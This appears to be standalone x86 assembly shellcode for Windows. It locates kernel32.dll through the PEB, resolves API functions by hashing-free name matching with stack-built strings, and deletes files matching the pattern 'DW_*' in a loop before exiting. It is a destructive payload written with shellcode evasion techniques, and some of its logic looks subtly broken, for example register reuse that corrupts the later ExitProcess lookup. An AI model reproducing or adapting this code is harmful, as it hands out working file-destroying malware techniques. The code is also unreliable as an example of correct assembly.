format PE GUI 4.0           

getkernel32:
  xor ecx, ecx                ; zeroing register ECX
  mul ecx                     ; zeroing register EAX EDX
  mov eax, [fs:ecx + 0x030]   ; PEB loaded in eax
  mov eax, [eax + 0x00c]      ; LDR loaded in eax
  mov esi, [eax + 0x014]      ; InMemoryOrderModuleList loaded in esi
  lodsd                       ; program.exe address loaded in eax (1st module)
  xchg esi, eax       
  lodsd                       ; ntdll.dll address loaded (2nd module)
  mov ebx, [eax + 0x10]       ; kernel32.dll address loaded in ebx (3rd module)
  ; EBX = base of kernel32.dll address

getAddressofName:
  mov edx, [ebx + 0x3c]       ; load e_lfanew address in ebx
  add edx, ebx        
  mov edx, [edx + 0x78]       ; load data directory
  add edx, ebx
  mov esi, [edx + 0x20]       ; load "address of name"
  add esi, ebx
  xor ecx, ecx

  ; ESI = RVAs

getProcAddress:
  inc ecx                             ; ordinals increment
  lodsd                               ; get "address of name" in eax
  add eax, ebx        
  cmp dword [eax], 0x50746547         ; GetP
  jnz getProcAddress
  cmp dword [eax + 0x4], 0x41636F72   ; rocA
  jnz getProcAddress
  cmp dword [eax + 0x8], 0x65726464   ; ddre
  jnz getProcAddress

getProcAddressFunc:
  mov esi, [edx + 0x24]       ; offset ordinals
  add esi, ebx                ; pointer to the name ordinals table
  mov cx, [esi + ecx * 2]     ; CX = Number of function
  dec ecx
  mov esi, [edx + 0x1c]       ; ESI = Offset address table
  add esi, ebx                ; we placed at the begin of AddressOfFunctions array
  mov edx, [esi + ecx * 4]    ; EDX = Pointer(offset)
  add edx, ebx                ; EDX = getProcAddress
  mov ebp, edx                ; save getProcAddress in EBP for future purpose

getFindFirstFileA:
  push 0x61614165      ; "eAaa" 
  sub byte [esp + 0x3], 0x61  
  sub byte [esp + 0x2], 0x61
  push 0x6c694674      ; "tFil" 
  push 0x73726946      ; "Firs" 
  push 0x646E6946      ; "Find"
  push esp                    
  push ebx                    
  call ebp              
  mov edi, eax 
  ;EDI = адрес FindFirstFileA

getFindNextFileA:
  push 0x61616141     ; 'Aaaa'
  sub byte[esp + 0x3], 0x61
  sub byte[esp + 0x2], 0x61
  sub byte[esp + 0x1], 0x61
  push 0x656c6946     ; 'File'
  push 0x7478654e     ; 'Next'
  push 0x646E6946     ; 'Find'
  push esp                    
  push ebx                    
  call ebp              
  mov esi, eax
  ;ESI = адрес FindNextFileA

getDeleteFileA:
  push 0x6141656c ; "leAa"
  sub word[esp+0x3],0x61
  push 0x69466574 ; "teFi"
  push 0x656c6544 ; "Dele"
  push esp                    
  push ebx                    
  call ebp              
  mov edx, eax  
  ;EDX = адрес DeleteFileA

find:
  sub sp, 800                  ; WIN32_FIND_DATA (600+ байт)
  mov ebx, esp

  ; Маска "DW_*" (с нулем в конце)
  xor eax,eax
  push eax
  push 0x2a5f5744 
  mov eax, esp
  push edx
  push ebx
  push eax
  call edi
  cmp eax, -1
  je getExitProcess
  mov ebp, eax
  pop edx

delete_loop:
  lea eax, [ebx + 0x2C]           ; WIN32_FIND_DATA.cFileName
  push edx
  push eax
  call edx                        ; DeleteFileA(cFileName)
  pop edx

  ; Поиск следующего файла
  push edx
  push ebx
  push ebp
  call esi
  pop edx
  test eax, eax
  jnz find



getExitProcess:
  add esp, 0x010                  ; clean the stack
  push 0x61737365                 ; asse
  sub word [esp + 0x3], 0x61      ; asse -> asse-a 
  push 0x636F7250                 ; corP
  push 0x74697845                 ; tixE
  push esp
  push ebx
  call edx

  xor ecx, ecx
  push ecx
  call eax